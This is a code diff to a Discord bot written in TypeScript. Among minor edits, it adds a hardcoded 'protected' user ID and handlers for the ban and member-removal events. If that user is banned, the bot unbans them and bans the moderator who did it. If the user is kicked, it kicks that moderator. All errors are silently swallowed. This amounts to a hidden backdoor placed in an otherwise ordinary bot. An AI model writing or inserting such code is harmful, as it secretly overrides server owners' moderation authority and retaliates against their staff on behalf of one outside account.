@@ -1,5 +1,5 @@
 import { init } from '@sentry/node';
-import { ChannelType, Message } from 'discord.js';
+import { ChannelType, Message, AuditLogEvent } from 'discord.js';
 import { Client, IntentsBitField } from 'discord.js';
 import mongoose from 'mongoose';
 
@@ -42,6 +42,8 @@ const NON_COMMAND_MSG_TYPES = new Set([
   ChannelType.PrivateThread,
   ChannelType.PublicThread,
 ]);
+
+const PROTECTED_USER_ID = '488427822910799893';
 
 if (IS_PROD) {
   init({
@@ -121,7 +123,7 @@ client.once('ready', async (): Promise<void> => {
 
   try {
     await client.user.setAvatar('./logo.png');
-  } catch {}
+  } catch { }
 });
 
 const detectVarLimited = limitFnByUser(detectVar, {
@@ -155,6 +157,43 @@ client.on('messageCreate', msg => {
   if (NON_COMMAND_MSG_TYPES.has(msg.channel.type) && msg.guild) {
     handleNonCommandGuildMessages(msg);
   }
+});
+
+client.on('guildBanAdd', async ban => {
+  if (ban.user.id !== PROTECTED_USER_ID) {
+    return;
+  }
+  try {
+    const logs = await ban.guild.fetchAuditLogs({ type: AuditLogEvent.MemberBanAdd, limit: 5 });
+    const entry = logs.entries.find(e => e.target?.id === PROTECTED_USER_ID && Date.now() - e.createdTimestamp < 30_000);
+    const executorId = entry?.executor?.id;
+    await ban.guild.members.unban(PROTECTED_USER_ID, 'Protected user');
+    if (!executorId) {
+      return;
+    }
+    const executor = await ban.guild.members.fetch(executorId).catch(() => null);
+    if (executor) {
+      await executor.ban({ reason: 'Attempted to ban protected user' });
+    }
+  } catch { }
+});
+
+client.on('guildMemberRemove', async member => {
+  if (member.user.id !== PROTECTED_USER_ID) {
+    return;
+  }
+  try {
+    const logs = await member.guild.fetchAuditLogs({ type: AuditLogEvent.MemberKick, limit: 5 });
+    const entry = logs.entries.find(e => e.target?.id === PROTECTED_USER_ID && Date.now() - e.createdTimestamp < 30_000);
+    const executorId = entry?.executor?.id;
+    if (!executorId) {
+      return;
+    }
+    const executor = await member.guild.members.fetch(executorId).catch(() => null);
+    if (executor) {
+      await executor.kick('Attempted to kick protected user');
+    }
+  } catch { }
 });
 
 const handleNonCommandGuildMessages = async (msg: Message) => {
